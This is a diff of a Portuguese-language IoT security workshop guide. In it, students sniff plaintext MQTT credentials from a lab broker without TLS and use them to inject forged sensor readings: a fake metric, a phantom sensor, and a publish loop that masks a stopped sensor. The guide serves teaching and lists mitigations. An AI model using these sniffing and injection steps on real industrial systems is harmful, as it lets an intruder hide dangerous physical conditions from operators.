@@ -60,14 +60,12 @@ layout: default
   - [Passo 4.1: Injeção com o script do atacante](#passo-41-injeção-com-o-script-do-atacante)
   - [Passo 4.2: Injeção manual com mosquitto_pub](#passo-42-injeção-manual-com-mosquitto_pub)
   - [Passo 4.3: Confirmar a alteração no dashboard](#passo-43-confirmar-a-alteração-no-dashboard)
-- [5. Desafio: Atacante de Telemetria](#5-desafio-atacante-de-telemetria)
+- [5. Desafio: Atacante de Telemetria — além do tópico original](#5-desafio-atacante-de-telemetria-além-do-tópico-original)
 - [6. Fase 4: Mitigação e Hardening (explicação)](#6-fase-4-mitigação-e-hardening-explicação)
   - [6.1 ACL: controle de acesso por tópico](#61-acl-controle-de-acesso-por-tópico)
   - [6.2 O que vem depois (TLS)](#62-o-que-vem-depois-tls)
 - [7. Lições Aprendidas](#7-lições-aprendidas)
 - [8. Atividade Extra: Análise no Wireshark](#8-atividade-extra-análise-no-wireshark)
-- [Checklist de Validação do Aluno](#checklist-de-validação-do-aluno)
-- [Quiz (3 perguntas)](#quiz-3-perguntas)
 - [Troubleshooting](#troubleshooting)
 - [Anexo A: O que é o MQTT?](#anexo-a-o-que-é-o-mqtt)
 
@@ -103,7 +101,7 @@ Premissas do laboratório:
 
 Objetivos de aprendizagem:
 
-1. Configurar um broker MQTT vulnerável (sem TLS) com autenticação por usuário/senha.
+1. Configurar um broker MQTT vulnerável (sem TLS) com **autenticação dupla**, como na indústria: **usuário/senha no pacote CONNECT** + **token de aplicação no payload JSON** — ambos em texto claro e sniffáveis.
 2. Capturar o tráfego MQTT com `tcpdump`/`tshark` e **ler as credenciais em texto claro** (usuário/senha no CONNECT e token no JSON).
 3. Compreender como um atacante descobre o tópico e o formato do payload.
 4. **Injetar dados falsos** no broker e fazer o dashboard exibir uma temperatura crítica inexistente.
@@ -329,14 +327,27 @@ Resultado esperado:
 
 ### Passo 3.2: Sniffing das credenciais no CONNECT (tcpdump)
 
-O pacote `CONNECT` (o primeiro da sessão MQTT) carrega o usuário e a senha. Para vê-lo, **reinicie o sensor** (Ctrl+C no terminal do sensor e rode de novo) **enquanto** captura:
+> [!IMPORTANT]
+> **Sequência de dois terminais:** o usuário e a senha só aparecem no pacote `CONNECT` — e o `CONNECT` só é enviado **no momento em que o sensor (re)conecta ao broker**. Por isso a captura precisa estar rodando **antes** da conexão do sensor. Siga a ordem: **1º tcpdump no terminal 1, 2º sensor no terminal 2.**
+
+**Terminal 1 — sniffer (inicie este primeiro; fica em espera capturando):**
 
 ```bash
-# No segundo terminal do kali:
-sudo timeout 15 tcpdump -i eth0 -A -s 0 "tcp port 1883" | grep -E "sensor_|tok_|temperatura" --color=always
+# No primeiro terminal do kali:
+sudo timeout 20 tcpdump -i eth0 -A -s 0 "tcp port 1883" | grep -E "sensor_|tok_|temperatura" --color=always
 ```
 
-Resultado esperado (saída real do laboratório do instrutor):
+**Terminal 2 — sensor legítimo (agora, no segundo terminal):**
+
+```bash
+# Se o sensor do Passo 3.1 ainda estiver rodando, pare-o com Ctrl+C.
+# Depois rode de novo — é a (re)conexão que dispara o CONNECT:
+python3 scripts/sensor.py 172.30.234.55
+```
+
+O `timeout 20` encerra o `tcpdump` sozinho após 20 segundos. O sensor continua rodando para os próximos passos.
+
+Resultado esperado (saída real do laboratório do instrutor, no **terminal 1**):
 
 ```text
 ... .MQTT...<....sensor_camara1..sensor_senha_2024
@@ -466,61 +477,112 @@ Análise:
 
 ---
 
-## 5. Desafio: Atacante de Telemetria
+## 5. Desafio: Atacante de Telemetria — além do tópico original
+
+> [!IMPORTANT]
+> **O que muda em relação ao item 4:** na Fase 3, o `atacante.py` injetou um valor **extremo** (99.5 °C) **no mesmo tópico do sensor** (`sensores/camara1/temperatura`) — um alerta alto e visível. Este desafio vai **além**: você vai injetar em **tópicos que o sensor legítimo nunca publica**, criar um **sensor fantasma** e fazer **sabotagem silenciosa**. O dashboard aceita tudo isso porque assina `sensores/#` — qualquer tópico sob esse prefixo é exibido como leitura legítima.
 
 **Objetivo geral:**
-- Como atacante, você intercepta a telemetria de uma planta IoT e **manipula as leituras** que a aplicação de monitoramento exibe.
+- Provar que um intruso, com as credenciais capturadas, não se limita a adulterar a temperatura da câmara 1: ele pode **criar telemetria do nada** (tópicos e até sensores que não existem) e **mascarar a ausência de um sensor real**.
 
 **Contextualização:**
-- Você é parte da equipe de Red Team de uma fábrica que monitora a temperatura das câmaras de resfriamento via MQTT.
-- O broker (sem TLS) está na rede industrial; o dashboard de monitoramento consome os tópicos `sensores/#`.
-- Seu trabalho: **provar** que um intruso consegue (a) ler as credenciais, (b) aprender o formato dos dados e (c) injetar leituras falsas — tudo sem acesso físico a nenhuma máquina, apenas observando a rede.
+- Você continua na equipe de Red Team da fábrica. O atacante da Fase 3 foi pego porque o alerta de 99.5 °C chamou a atenção. Agora você precisa mostrar ao cliente que dá para atacar **sem gerar nenhum alerta** — e ainda **inventar dados** que a equipe de monitoramento vai acreditar.
 
-**Passo-a-passo detalhado para o atacante:**
+**Você já tem (do Passo 3.2 / item 4):** usuário `sensor_camara1`, senha `sensor_senha_2024` e token `tok_sensor_camara1_7f3a9c`.
 
-1. **Descobrir o broker**: scan simples na subrede (`nmap -p 1883 172.30.234.0/24` ou `nc -zv IP 1883`).
-2. **Capturar credenciais** (passivo, não deixa rastros):
-   ```bash
-   sudo timeout 15 tcpdump -i eth0 -A -s 0 "tcp port 1883" | grep -E "sensor_|tok_|temperatura"
-   ```
-   - Você obtém `sensor_camara1`, `sensor_senha_2024` e o token `tok_sensor_camara1_7f3a9c`.
-3. **Descobrir o tópico e o formato** (passivo):
-   ```bash
-   timeout 15 tshark -i eth0 -f "tcp port 1883" -Y "mqtt.msgtype==3" \
-     -T fields -e mqtt.topic -e mqtt.msg -E separator=' | '
-   ```
-   - Tópico: `sensores/camara1/temperatura`; payload: JSON com `sensor`, `metrica`, `valor`, `unidade`, `token`, `timestamp`.
-4. **Assinar o tópico como leitor** (usa as credenciais roubadas; comportamento idêntico ao de um dispositivo legítimo):
-   ```bash
-   mosquitto_sub -h 172.30.234.55 -p 1883 -u sensor_camara1 -P sensor_senha_2024 \
-     -v -t "sensores/#"
-   ```
-5. **Injetar a leitura falsa**:
-   ```bash
-   mosquitto_pub -h 172.30.234.55 -p 1883 -u sensor_camara1 -P sensor_senha_2024 \
-     -t sensores/camara1/temperatura \
-     -m '{"sensor":"camara1","metrica":"temperatura","valor":99.5,"unidade":"C","token":"tok_sensor_camara1_7f3a9c","timestamp":1}'
-   ```
-6. **Confirmar o impacto**: `docker logs -f laboratorio-mqtt-dashboard` no servidor mostra `[ALERTA] TEMPERATURA CRITICA: 99.5C`.
-7. **Varie o ataque (opcional):**
-   - Publique **leituras normais** continuamente para **mascarar** um evento real (sabotagem silenciosa).
-   - Injete em **outros tópicos** (`sensores/camara1/umidade`, `sensores/camara1/gas`) para mostrar que, sem ACL, o mesmo usuário escreve onde quiser.
+> [!NOTE]
+> **Sem `mosquitto_pub` no seu kali?** Se você não pode instalar o pacote `mosquitto-clients` (precisa de `sudo`), use a função Python abaixo no lugar — ela faz exatamente a mesma publicação via `paho-mqtt` (já instalado), que é o que o `atacante.py` usa:
+>
+> ```python
+> import json, paho.mqtt.client as mqtt
+> def pub(topic, payload):
+>     c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
+>     c.username_pw_set("sensor_camara1", "sensor_senha_2024")
+>     c.connect("172.30.234.55", 1883, 60)
+>     c.publish(topic, json.dumps(payload), qos=0)
+>     c.disconnect()
+> ```
+> Depois, cada comando `mosquitto_pub` do desafio pode ser trocado por uma chamada:
+> `pub("sensores/camara1/umidade", {"sensor":"camara1","metrica":"umidade","valor":12.5,"unidade":"%","token":"tok_sensor_camara1_7f3a9c","timestamp":1})`
 
-**Por que este ataque funciona?**
-- **Ausência de TLS**: credenciais e dados viajam em texto claro.
-- **Token fixo no payload**: o token embutido no JSON é capturado junto com os dados — a "proteção" de aplicação vira chave reutilizável.
-- **Sem ACL**: o usuário do sensor pode publicar em qualquer tópico.
-- **Confiança cega no destinatário**: o dashboard valida o token, mas não a origem nem a integridade da mensagem.
+### Parte A — Métrica falsa em tópico que o sensor nunca publica
+
+O sensor legítimo só publica em `sensores/camara1/temperatura`. E se o atacante publicar **umidade** — uma métrica que a câmara 1 nem tem?
+
+```bash
+mosquitto_pub -h 172.30.234.55 -p 1883 -u sensor_camara1 -P sensor_senha_2024 \
+  -t sensores/camara1/umidade \
+  -m '{"sensor":"camara1","metrica":"umidade","valor":12.5,"unidade":"%","token":"tok_sensor_camara1_7f3a9c","timestamp":1}'
+```
+
+No dashboard (`docker logs -f laboratorio-mqtt-dashboard` no servidor):
+
+```text
+[DASHBOARD] [OK] sensores/camara1/umidade: 12.5C (token valido)
+```
+
+**Pergunta para refletir:** por que o dashboard mostra `12.5C` para uma leitura de *umidade* em `%`? (Dica: olhe o `on_message` do `aplicacao.py` — ele imprime `{valor}C` fixo, sem ler o campo `unidade` do JSON. A aplicação confia no valor sem validar a consistência do payload.)
+
+### Parte B — Sensor fantasma (telemetria de um dispositivo que não existe)
+
+Crie um sensor **camara2** — que a planta nunca instalou:
+
+```bash
+mosquitto_pub -h 172.30.234.55 -p 1883 -u sensor_camara1 -P sensor_senha_2024 \
+  -t sensores/camara2/temperatura \
+  -m '{"sensor":"camara2","metrica":"temperatura","valor":23.1,"unidade":"C","token":"tok_sensor_camara1_7f3a9c","timestamp":1}'
+```
+
+No dashboard:
+
+```text
+[DASHBOARD] [OK] sensores/camara2/temperatura: 23.1C (token valido)
+```
+
+**Pergunta para refletir:** a equipe de monitoramento passa a ver uma "câmara 2" que não existe. Com um sensor fantasma publicando valores normais por semanas, que decisões erradas a operação pode tomar?
+
+### Parte C — Sabotagem silenciosa (mascarar a ausência do sensor real)
+
+Agora o ataque mais perigoso: **sem gerar alerta nenhum**.
+
+1. Pare o sensor legítimo (Ctrl+C no terminal do sensor).
+2. No dashboard, as leituras de `sensores/camara1/temperatura` **param de chegar** — mas isso logo chamaria atenção da operação.
+3. O atacante **assume a identidade do sensor**: publique leituras normais continuamente no tópico do sensor, usando as credenciais roubadas:
+
+```bash
+while true; do
+  mosquitto_pub -h 172.30.234.55 -p 1883 -u sensor_camara1 -P sensor_senha_2024 \
+    -t sensores/camara1/temperatura \
+    -m '{"sensor":"camara1","metrica":"temperatura","valor":22.4,"unidade":"C","token":"tok_sensor_camara1_7f3a9c","timestamp":'"$(date +%s)"'}'
+  sleep 5
+done
+```
+
+No dashboard, o fluxo de leituras continua **normal** — como se o sensor real estivesse vivo:
+
+```text
+[DASHBOARD] [OK] sensores/camara1/temperatura: 22.4C (token valido)
+[DASHBOARD] [OK] sensores/camara1/temperatura: 22.4C (token valido)
+```
+
+**O ponto didático:** o sensor físico pode ter sido desligado, roubado ou estar reportando errado — e a operação não percebe, porque as leituras "continuam chegando". Em um ataque real, o atacante ainda **aumentaria a temperatura real** para níveis críticos sem que ninguém veja, substituindo os valores reais por leituras normais falsas.
+
+4. (Opcional) Combine com a Fase 3: enquanto o "sensor fantasma" publica 22.4 °C, o atacante **aumenta a temperatura real** publicando valores altos em outro intervalo — a operação vê apenas o fluxo normal.
+
+**Por que este ataque funciona (recapitulando o que você já viu):**
+- **Sem ACL**: o usuário `sensor_camara1` (credencial roubada) pode publicar em **qualquer** tópico — inclusive `sensores/camara2/...`, que não pertence a ele.
+- **Token único e fixo**: o mesmo token serve para todos os tópicos — o dashboard não liga o token a um sensor ou tópico específico.
+- **Dashboard sem validação de origem/consistência**: não confere se o sensor existe, se a unidade bate com a métrica, nem se o valor é plausível para o contexto.
+- **Confiança cega**: tudo que chega com token válido é exibido como legítimo.
 
 **Mitigações recomendadas (para o time de defesa):**
-1. **Habilitar TLS** no broker (porta 8883) e exigir certificados nos clientes — o sniffing passa a mostrar apenas bytes criptografados.
-2. **ACL por tópico** (o Mosquitto já suporta `acl_file`): o sensor só publica no próprio tópico; a aplicação só lê.
-3. **Token rotativo/one-time** e assinatura das mensagens (HMAC) — o payload adulterado deixa de validar.
-4. **Validação de origem** na aplicação (ex.: comparar IP/MAC de origem com o cadastro do sensor).
-5. **Segmentação de rede** — separar a rede dos sensores da rede da aplicação; o sniffer externo deixa de ver o tráfego.
-6. **Detecção de anomalias** — um valor de 99.5°C deve disparar verificação de integridade, não só alarme de temperatura.
+1. **ACL por tópico** (o `conf/mosquitto.acl` do workshop já mostra): `sensor_camara1` só pode publicar em `sensores/camara1/#` — os ataques B e C morrem aqui, e o A fica limitado a tópicos da própria câmara.
+2. **Validação de origem na aplicação**: o dashboard deve conhecer os sensores cadastrados (câmara 1 existe; câmara 2 não) e a faixa plausível de cada métrica.
+3. **Token por sensor + tópico**: token distinto por dispositivo e validado contra o tópico publicado (o token da câmara 1 não valida em `sensores/camara2/...`).
+4. **Heartbeat e watchdog**: a aplicação deve detectar a ausência de leituras de um sensor (ex.: nenhuma publicação em 30 s → alarme de sensor offline) — a sabotagem silenciosa perde o efeito.
+5. **TLS** (fase futura): sem o sniffing, o atacante não obtém credenciais nem token para começar.
 
-Esse desafio te coloca com **skin in the game**: as credenciais, o tópico e o formato dos dados **não são entregues prontos** — você precisa descobri-los a partir da captura, e então usá-los para manipular a telemetria, identificando os pontos de segurança que precisam ser corrigidos.
+Ao terminar as Partes A, B e C, você terá demonstrado o espectro completo do ataque MQTT sem TLS: **ler credenciais → aprender o formato → injetar valores extremos (item 4) → criar telemetria falsa e mascarar a ausência do sensor (este desafio)**.
 
 ---
 
@@ -618,53 +680,6 @@ Leve a captura para uma máquina com **Wireshark** instalado:
 | **Wireshark** | Filtro `mqtt` + Follow > TCP Stream | Sessão remontada com credenciais e JSON legíveis |
 
 > **Dica de estudo:** compare a captura deste laboratório (porta 1883, texto claro) com uma futura captura TLS (porta 8883) — a diferença visual no Wireshark é o resumo do porquê este workshop existe.
-
----
-
-## Checklist de Validação do Aluno
-
-- [ ] Subi o broker MQTT + dashboard no servidor (`docker compose up -d --build`).
-- [ ] Confirmei com `docker compose ps` a porta `0.0.0.0:1883->1883/tcp` e os 2 containers `Up`.
-- [ ] Confirmei no dashboard: `[DASHBOARD] Conectado ao broker ... rc=Success`.
-- [ ] Testei do kali: `nc -zv IP_SERVIDOR 1883`.
-- [ ] Rodei o sensor no kali e vi as publicações com temperatura ~20–26 °C.
-- [ ] Capturei as credenciais em texto claro com `tcpdump -A` (vi `sensor_camara1` e `sensor_senha_2024`).
-- [ ] Liste tópicos e payloads com `tshark` (vi `sensores/camara1/temperatura` e o JSON com o token).
-- [ ] Rodei `atacante.py` e vi a Fase A (sniff) capturando payloads legítimos.
-- [ ] Vi a Fase B publicando o payload falso (99.5 °C).
-- [ ] Confirmei no dashboard: `[ALERTA] TEMPERATURA CRITICA: 99.5C - ACIONAR RESFRIAMENTO!`.
-- [ ] (Opcional) Injetei manualmente com `mosquitto_pub` e o efeito foi idêntico.
-- [ ] Expliquei, com minhas palavras, por que TLS é obrigatório em redes MQTT de produção.
-
----
-
-## Quiz (3 perguntas)
-
-1. **No protocolo MQTT sem TLS, onde exatamente um observador de rede consegue ler o usuário e a senha?**
-   a) No pacote `PUBLISH`, junto com o payload JSON.
-   b) No pacote `CONNECT`, nos campos de autenticação do cabeçalho MQTT.
-   c) No pacote `SUBSCRIBE`, no campo de tópico.
-   d) Não é possível — o MQTT sempre criptografa as credenciais.
-
-2. **Um dispositivo IoT publica temperatura com um "token secreto" dentro do JSON para autenticar na aplicação. Por que esse token NÃO protege o dado?**
-   a) Porque o broker ignora o token ao rotear a mensagem.
-   b) Porque o token é validado apenas no cliente, não no servidor.
-   c) Porque o token viaja em texto claro no mesmo payload em que o atacante lê os valores — ele é capturado junto e reutilizado.
-   d) Porque o token muda a cada publicação.
-
-3. **Depois de injetar uma leitura falsa (99.5 °C), por que o dashboard exibe o alerta como se o dado fosse legítimo?**
-   a) Porque o dashboard não valida nada — aceita qualquer payload sem conferir token.
-   b) Porque o payload do atacante tem o mesmo token, mesmo tópico e mesmo formato dos legítimos; sem TLS, a aplicação não tem como distinguir a origem.
-   c) Porque o broker reescreve o payload antes de entregar ao dashboard.
-   d) Porque o dashboard só aceita dados acima de 90 °C.
-
-<details>
-<summary><b>Gabarito</b></summary>
-
-1. **b)** — O usuário e a senha viajam nos campos de autenticação do pacote `CONNECT` (o primeiro da sessão), em texto claro quando não há TLS.
-2. **c)** — O token embutido no JSON trafega em texto claro; o atacante o lê na mesma captura em que aprende o formato dos dados e o reutiliza.
-3. **b)** — Sem TLS e sem validação de origem, um payload com token válido, tópico correto e formato idêntico é indistinguível de uma publicação legítima.
-</details>
 
 ---
 
